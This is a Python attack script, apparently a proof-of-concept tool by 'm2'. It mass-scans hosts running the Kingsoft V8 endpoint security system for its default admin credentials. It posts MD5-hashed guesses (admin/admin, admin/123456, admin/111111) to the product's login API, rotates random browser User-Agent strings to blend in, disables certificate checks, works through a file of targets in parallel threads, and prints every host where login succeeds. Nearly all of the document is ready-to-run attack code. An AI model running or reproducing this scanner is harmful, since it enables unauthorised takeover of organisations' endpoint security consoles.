import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import hashlib


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

#payload
def fuzz(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc +'/inter/ajax.php?cmd=get_user_login_cmd'
	url2 = url.scheme + '://' + url.netloc

	#账号密码字典
	username=['admin']
	password=['admin','123456','111111']
	
	for i in username:
		for j in password:
			#密码md5加密
			md=hashlib.md5()
			md.update(j.encode(encoding='utf-8'))
			j_md5 = md.hexdigest()
			data='{"get_user_login_cmd":{"name":"' + i + '","password":"' + j_md5 + '"}}'
			try:
				headers = {'User-Agent': get_ua()}
				r=requests.post(url1,headers=headers,data=data,verify=False,allow_redirects=True,timeout=10)
				if r.status_code == 200 and 'accountType":"0' in r.text:
					print('\033[32m[+]%s Login Success！ username:%s&password:%s\033[0m' %(url2,i,j))
					break
				else :
					print('\033[31m[-]%s Login False\033[0m' %url2)
			except Exception as e:
				print('[!]%s is timeout' %url2)
				break



#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		works.append(i)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(fuzz, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''

		金山V8 终端安全系统 默认弱口令漏洞      
	                                                                    
	                                                                    
                                                        	By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='金山V8终端安全系统默认弱口令漏洞 By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	if url != None and filename == None:
		fuzz(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时%d' %(end-start))